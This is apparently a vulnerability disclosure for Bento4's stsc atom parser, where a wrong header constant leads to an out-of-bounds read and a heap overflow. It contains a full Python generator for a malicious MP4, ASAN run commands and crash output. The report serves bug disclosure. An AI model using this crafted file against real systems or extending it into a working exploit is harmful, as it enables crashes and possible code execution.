## Bug0: AP4_StscAtom Wrong Header Constant Causes OOB Read and Downstream Heap Buffer Overflow

In `AP4_StscAtom::AP4_StscAtom` (Ap4StscAtom.cpp, lines 75–77), the bounds check uses `AP4_ATOM_HEADER_SIZE` (8) instead of the correct `AP4_FULL_ATOM_HEADER_SIZE` (12) for the stsc FullBox, allowing a crafted 24-byte stsc box with `entry_count=1` to pass validation and read 4 bytes beyond the stsc box boundary into the next adjacent box, which corrupts the parsed `sample_description_index` and triggers a downstream heap-buffer-overflow in `AP4_Stz2Atom::AP4_Stz2Atom`.

### PoC

Craft a malicious MP4 file using the Python script below and process it with the ASAN-instrumented mp42aac binary to trigger the vulnerability.

```python
#!/usr/bin/env python3
import struct

OUTPUT = "poc_input.mp4"


def box(box_type, data):
    size = 8 + len(data)
    return struct.pack(">I", size) + box_type + data


def full_box(box_type, version, flags, data):
    header = struct.pack(">B", version) + struct.pack(">I", flags)[1:]
    return box(box_type, header + data)


# Malicious stsc box (size=24): Full atom header=12B, entry_count=4B, partial entry=8B.
# Correct check: (24-12-4)/12 = 0 < 1 -> REJECT
# Buggy check:   (24-8-4)/12  = 1 >= 1 -> PASS, reads 12B, crossing 4B into stco.
stsc_entry_partial = struct.pack(">II", 1, 1)  # first_chunk=1, samples_per_chunk=1
stsc_header = struct.pack(">I", 24) + b"stsc"
stsc_version_flags = b"\x00\x00\x00\x00"
stsc_entry_count = struct.pack(">I", 1)
stsc = stsc_header + stsc_version_flags + stsc_entry_count + stsc_entry_partial
assert len(stsc) == 24

# stco box (full atom, entry_count=0, size=16).
# Its first 4 bytes (0x00000010=16) are read as sample_description_index by the stsc parser.
stco = full_box(b"stco", 0, 0, struct.pack(">I", 0))
assert len(stco) == 16
assert stco[:4] == b"\x00\x00\x00\x10"

stsz = full_box(b"stsz", 0, 0, struct.pack(">II", 0, 0))
stts = full_box(b"stts", 0, 0, struct.pack(">I", 0))
stsd = full_box(b"stsd", 0, 0, struct.pack(">I", 0))

stbl_data = stsd + stts + stsc + stco + stsz
stbl = box(b"stbl", stbl_data)

smhd = full_box(b"smhd", 0, 0, struct.pack(">HH", 0, 0))

url_entry = full_box(b"url ", 0, 1, b"")
dref_payload = struct.pack(">I", 1) + url_entry
dref = full_box(b"dref", 0, 0, dref_payload)
dinf = box(b"dinf", dref)

minf_data = smhd + dinf + stbl
minf = box(b"minf", minf_data)

mdhd_payload = struct.pack(">IIII", 0, 0, 44100, 0) + struct.pack(">HH", 0x55C4, 0)
mdhd = full_box(b"mdhd", 0, 0, mdhd_payload)

hdlr_payload = struct.pack(">I", 0) + b"soun" + b"\x00" * 12 + b"SoundHandler\x00"
hdlr = full_box(b"hdlr", 0, 0, hdlr_payload)

mdia_data = mdhd + hdlr + minf
mdia = box(b"mdia", mdia_data)

tkhd_payload = (
    struct.pack(">IIIII", 0, 0, 1, 0, 0) +
    b"\x00" * 8 +
    struct.pack(">hhhh", 0, 0, 0x0100, 0) +
    b"\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" +
    b"\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00" +
    b"\x00\x00\x00\x00\x00\x00\x00\x00\x40\x00\x00\x00" +
    struct.pack(">II", 0, 0)
)
tkhd = full_box(b"tkhd", 0, 3, tkhd_payload)

trak_data = tkhd + mdia
trak = box(b"trak", trak_data)

mvhd_payload = (
    struct.pack(">IIII", 0, 0, 1000, 0) +
    struct.pack(">I", 0x00010000) +
    struct.pack(">H", 0x0100) +
    b"\x00" * 10 +
    b"\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" +
    b"\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00" +
    b"\x00\x00\x00\x00\x00\x00\x00\x00\x40\x00\x00\x00" +
    b"\x00" * 24 +
    struct.pack(">I", 2)
)
mvhd = full_box(b"mvhd", 0, 0, mvhd_payload)

moov_data = mvhd + trak
moov = box(b"moov", moov_data)

ftyp = box(b"ftyp", b"M4A " + struct.pack(">I", 0))

mp4 = ftyp + moov
with open(OUTPUT, "wb") as f:
    f.write(mp4)

print(f"[+] Written {len(mp4)} bytes to {OUTPUT}")
```

```bash
python3 gen.py
ASAN_OPTIONS="abort_on_error=0:log_path=./asan.log" /data/ylwang/non-textfuzz/target/Bento4/build_test/bin/mp42aac poc_input.mp4 /dev/null || true
for f in ./asan.log.*; do grep -E "AddressSanitizer|ERROR:|runtime error:" "$f" || true; done
```

**Result:** ERROR: AddressSanitizer: heap-buffer-overflow on address 0x502000000111 at pc 0x555e5d9ccef9 bp 0x7ffc71d5f860 sp 0x7ffc71d5f850
READ of size 1 at 0x502000000111 thread T0
    #0 0x555e5d9ccef8 in AP4_Stz2Atom::AP4_Stz2Atom(unsigned int, unsigned char, unsigned int, AP4_ByteStream&) (mp42aac+0xc51ef8)
    #1 0x555e5d9cd9fb in AP4_Stz2Atom::Create(unsigned int, AP4_ByteStream&) (mp42aac+0xc529fb)

### Impact

An attacker who supplies a crafted MP4 file can cause `mp42aac` to read 4 bytes beyond the stsc box boundary, corrupting the `sample_description_index` value and misaligning the stream position for all subsequent atom parsing, which cascades into a heap-buffer-overflow in `AP4_Stz2Atom`. The attack surface is any invocation of `mp42aac` on an untrusted MP4 file, requiring no privileges or authentication. Depending on heap layout, the overflow may be exploitable for information disclosure or, in scenarios where the attacker also controls heap contents, for arbitrary code execution.
